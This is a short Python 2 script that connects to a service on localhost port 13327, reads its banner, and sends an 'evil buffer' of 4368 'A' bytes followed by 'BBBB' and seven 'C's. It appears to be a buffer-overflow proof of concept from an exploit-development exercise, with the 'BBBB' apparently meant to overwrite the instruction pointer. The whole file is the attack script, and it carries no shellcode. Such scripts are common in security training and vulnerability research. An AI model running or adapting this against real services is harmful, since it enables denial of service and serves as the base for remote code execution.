#!/usr/bin/python 
import socket

host = "127.0.0.1" 

buffer = "\x41" *4368 + "B" *4 + "C" * 7

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024) 
print data 
s.send(buffer) 
s.close()
print "[*]Payload Sent !"
